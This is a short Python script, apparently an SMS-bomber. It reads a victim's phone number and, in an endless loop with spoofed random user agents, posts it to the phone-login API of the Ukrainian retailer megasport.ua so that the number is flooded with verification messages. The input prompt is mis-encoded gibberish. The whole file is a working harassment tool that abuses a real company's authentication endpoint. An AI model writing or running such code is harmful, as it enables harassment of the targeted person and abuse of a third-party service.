import requests, fake_useragent, time

user = fake_useragent.UserAgent().random
headers = {'user_agent' : user}
NUMBER = input('Beeante HOMep tenedona: (6es +)')



while True:
 try:
     print('Отправлено')
     response = requests.post('https://megasport.ua/api/auth/phone/?language=ua', headers=headers, data={'phone': "+" + NUMBER})
 except:
     print('Не доставлено')
     time.sleep(5000)